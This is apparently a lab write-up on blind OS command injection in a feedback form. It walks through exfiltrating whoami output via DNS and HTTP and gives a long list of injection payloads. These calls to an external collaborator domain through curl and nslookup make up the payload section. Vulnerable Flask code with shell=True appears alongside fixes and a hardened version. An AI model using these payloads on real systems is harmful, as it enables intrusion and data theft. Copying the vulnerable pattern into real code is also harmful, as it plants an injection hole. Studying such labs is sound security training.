# Summary – Lab 5: Blind OS command injection with out-of-band data exfiltration

## Lab Information
**Topic:** OS command injection  
**Difficulty:** Apprentice

## Lab Description
This lab is similar to Lab 4 but goes one step further: instead of merely proving command execution via out-of-band interactions, the objective is to exfiltrate the output of `whoami` via a DNS query (or HTTP request) to an external domain such as Burp Collaborator or a custom server.

The feedback function is vulnerable to blind OS command injection, executed asynchronously with no in-band evidence. The attacker must capture the command output by embedding it into a DNS hostname or HTTP path sent to an external system.

## Vulnerability Analysis
The backend again constructs and executes a shell command using untrusted feedback fields. Since there is no visible output or writable folder to exploit, the only side-channel is network egress.

To extract the result of `whoami`, the attacker can interpolate command substitution into an OAST payload, for example:

- DNS: `nslookup $(whoami).<counter>.<collaborator-domain>`
- HTTP: `curl http://<collaborator-domain>/<counter>/$(whoami)`

When the server executes this command, the outbound DNS lookup or HTTP request includes the username (the output of `whoami`) as part of the domain or path, which can be observed in logs.

## Exploitation Steps
1. **Identify the attack surface**
   - Feedback form at `/feedback` posting to `POST /feedback/submit` with CSRF token.
2. **Enumerate injection points**
   - Parameters: `name`, `email`, `subject`, `message`.
3. **Use an Intruder-like Sniper attack with exfiltration payloads**
   - Test each parameter with payload wrappers embedding OAST exfil commands.
   - DNS exfil example:
     - `nslookup $(whoami).<counter>.<collaborator-domain>`
   - HTTP exfil example:
     - `curl http://attacker-domain/<counter>/$(whoami)`
4. **Monitor DNS/HTTP logs on the external server**
   - For DNS: observe queries like `<username>.<counter>.<collaborator-domain>`.
   - For HTTP: observe request paths like `/<counter>/<username>`.
5. **Determine the OS user**
   - Extract `<username>` (e.g. `peter-ID`) from the external logs.
6. **Submit the username to complete the lab**

We use a counter at both requests to identify what exact parameter is vulnerable and what exact payload works. You can send payloads without counter for simplifying the attack, just to solve the lab.

## Separators List
```sh
;
|
||
&
&&
\n
`(payload)`
$(payload)
```

## Payloads List
```sh
;curl http://0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com/1/$(whoami)
&curl http://0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com/2/$(whoami)
&&curl http://0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com/3/$(whoami)
|curl http://0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com/4/$(whoami)
||curl http://0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com/5/$(whoami)
%0acurl http://0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com/6/$(whoami)
$(curl http://0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com/7/$(whoami)
`curl http://0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com/8/$(whoami)
;curl http://0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com/9/$(whoami);
&curl http://0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com/10/$(whoami)&
&&curl http://0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com/11/$(whoami)&&
|curl http://0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com/12/$(whoami)|
||curl http://0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com/13/$(whoami)||
%0acurl http://0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com/14/$(whoami)%0a
`curl http://0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com/15/$(whoami)`
$(curl http://0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com/16/$(whoami))

;nslookup $(whoami).test1.0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com
&nslookup $(whoami).test2.0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com
&&nslookup $(whoami).test3.0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com
|nslookup $(whoami).test4.0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com
||nslookup $(whoami).test5.0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com
%0anslookup $(whoami).test6.0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com
$(nslookup $(whoami).test7.0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com
`nslookup $(whoami).test8.0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com
;nslookup $(whoami).test9.0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com;
&nslookup $(whoami).test10.0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com&
&&nslookup $(whoami).test11.0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com&&
|nslookup $(whoami).test12.0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com|
||nslookup $(whoami).test13.0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com||
%0anslookup $(whoami).test14.0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com%0a
`nslookup $(whoami).test15.0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com`
$(nslookup $(whoami).test16.0vwnmm7szva3vvmf58rw532locu3it6i.oastify.com)
```

## Pro tip to make DNS OAST reliable

Use unique subdomains per request, e.g.:

`nslookup $(date +%s).yourid.oastify.net` 

`nslookup $(RANDOM).yourid.oastify.net`

## AppSec Perspective

### What the underlying code might be
The vulnerable code is conceptually identical to Lab 4, for example:

```python
import subprocess
from flask import request

def submit_feedback():
    name = request.form.get("name", "")
    email = request.form.get("email", "")
    subject = request.form.get("subject", "")
    message = request.form.get("message", "")

    # VULNERABLE: shell command using user input,
    # executed asynchronously, output is discarded.
    cmd = (
        f"/usr/sbin/sendmail '{email}' <<EOF\n"
        f"Subject: {subject}\nFrom: {name}\n\n{message}\nEOF"
    )
    subprocess.Popen(cmd, shell=True)  # asynchronous, no captured output
    
    return "Thanks for your feedback"
```

The difference in Lab 5 lies not in the code but in the **attacker’s technique**—embedding command output in the outbound request for exfiltration.

### Security issues enabling exploitation
- **OS command injection** due to shell invocation with untrusted input.
- **Unrestricted outbound DNS/HTTP traffic** from the application server to arbitrary domains.
- Lack of monitoring or alerting on suspicious DNS names or HTTP paths.
- The application often runs in an environment where outbound DNS and HTTP are allowed by default.

### How to fix it
1. **Avoid the shell entirely (primary fix)**  
   - Use safe APIs that pass arguments as a list and do not invoke a shell:
   ```python
   cmd = ["/usr/local/bin/stockcheck", product_id, store_id]
   output = subprocess.check_output(cmd, shell=False, text=True)
   ```
   - In Node.js, use `spawn`/`execFile` with an array of arguments and no shell.

2. **Apply strict input validation / allow-listing**
   - `name`, `subject`, `message` should be text without special symbols.
   - Enforce type and range constraints server-side (e.g. only lower and upper case letters).

3. **Least privilege & separation of duties**
   - Run the web application under an account with minimal OS privileges.
   - If possible, isolate the stock-checking logic in a separate service, not via shell.

4. **Control outbound network traffic**
   - Use egress firewall rules to restrict where application servers can connect.
   - Limit DNS resolution and HTTP/HTTPS requests to known internal services or trusted endpoints.
   - This significantly reduces the impact of command injection or SSRF.

3. **Input validation and canonicalization**
   - As with previous labs, validate feedback fields, stripping or rejecting shell metacharacters and unexpected characters.
   - Enforce length, charset and format constraints.

5. **Monitoring and detection**
   - Monitor DNS logs for suspicious domains (random hostnames, long labels) and anomalous query rates.
   - Monitor outbound HTTP(S) logs for unexpected hosts, URIs, or user agents associated with application servers.

### Safe code version
```python
import re
import subprocess
from flask import request, abort

SENDMAIL_PATH = "/usr/sbin/sendmail"

# Allow only "normal" header characters: letters, digits, space, and some punctuation.
# This is a strict allow-list to avoid CRLF, control chars, etc.
HEADER_RE = re.compile(r"^[A-Za-z0-9 .,'\"()\-]*$")

# Basic email pattern for demonstration; in real apps use a robust library (e.g. email-validator).
EMAIL_RE = re.compile(r"^[^@\s]+@[^@\s]+\.[^@\s]+$")

MAX_NAME_LEN = 200
MAX_SUBJECT_LEN = 200
MAX_EMAIL_LEN = 254
MAX_MESSAGE_LEN = 10_000  # body can be larger but still should be bounded


def _validate_header_field(value: str, max_len: int, field_name: str) -> str:
    """
    Validate a header-like field using an allow-list:
    - strip leading/trailing whitespace
    - enforce length
    - enforce allowed character set (no CR/LF, no control characters)
    """
    value = (value or "").strip()

    if len(value) > max_len:
        abort(400, description=f"{field_name} too long")

    if not HEADER_RE.fullmatch(value):
        # OWASP-style: fail closed when unexpected characters appear.
        abort(400, description=f"Invalid characters in {field_name}")

    return value


def _validate_email(email: str) -> str:
    # First apply generic header validation (length & allowed chars)
    email = _validate_header_field(email, MAX_EMAIL_LEN, "email")

    # Then apply more specific email shape check
    if not EMAIL_RE.fullmatch(email):
        abort(400, description="Invalid email address")

    return email


def submit_feedback():
    # 1. Extract raw inputs
    raw_name = request.form.get("name", "")
    raw_email = request.form.get("email", "")
    raw_subject = request.form.get("subject", "")
    raw_message = request.form.get("message", "")

    # 2. Strong validation / allow-listing for header fields
    name = _validate_header_field(raw_name, MAX_NAME_LEN, "name")
    email = _validate_email(raw_email)
    subject = _validate_header_field(raw_subject, MAX_SUBJECT_LEN, "subject")

    # 3. Message body: allow newlines, but bound the size
    message = raw_message or ""
    if len(message) > MAX_MESSAGE_LEN:
        abort(400, description="message too long")

    # 4. Build RFC5322-ish message.
    #    No CRLF injection possible because headers are allow-listed.
    email_body = (
        f"To: {email}\n"
        f"From: {name or 'no-reply@example.com'}\n"
        f"Subject: {subject}\n"
        "\n"
        f"{message}\n"
    )

    # 5. Call sendmail safely WITHOUT a shell.
    try:
        proc = subprocess.Popen(
            [SENDMAIL_PATH, "-i", "--", email],  # args list → no shell
            stdin=subprocess.PIPE,
            text=True,
        )
        proc.communicate(email_body, timeout=10)

        if proc.returncode != 0:
            # In a real app, log return code / stderr, but don't leak details to user.
            abort(500, description="Failed to send feedback")
    except Exception:
        abort(500, description="Failed to send feedback")

    return "Thanks for your feedback"
```

## Key Takeaways

**Lessons from Attacker perspective**
- Even when no in-band output or writable directories exist, command output can often be tunneled out through DNS or HTTP.
- Command substitution like `$(whoami)` inside `nslookup` or `curl` is a powerful pattern for exfiltrating small pieces of data.
- Out-of-band channels are essential tools when dealing with hardened or opaque applications.
- Testing different separators and wrappers (`;`, `&`, `|`, backticks, `$()`, newlines) helps bypass simple filters (increases chances of hitting the vulnerable parameter and syntax).
- Test all user-controllable parameters (injection points), not just the obviously “dangerous” ones; in this lab it's not only the `email` field.

**Lessons from AppSec (defender) perspective**
- Treat any OS command execution as a high-risk operation; avoid it where possible (Remove shell usage in business logic; use high-level libraries that do not expose OS commands).
- Never pass untrusted input into a shell; use parameterized process APIs with allow-listed arguments.
- Apply least privilege and avoid exposing raw backend or OS-level output to clients.
- Address root cause (command injection), but also harden network controls as defense-in-depth to reduce the impact of such vulnerabilities.
- DNS/HTTP out-of-band requests is a powerful exfiltration channel.
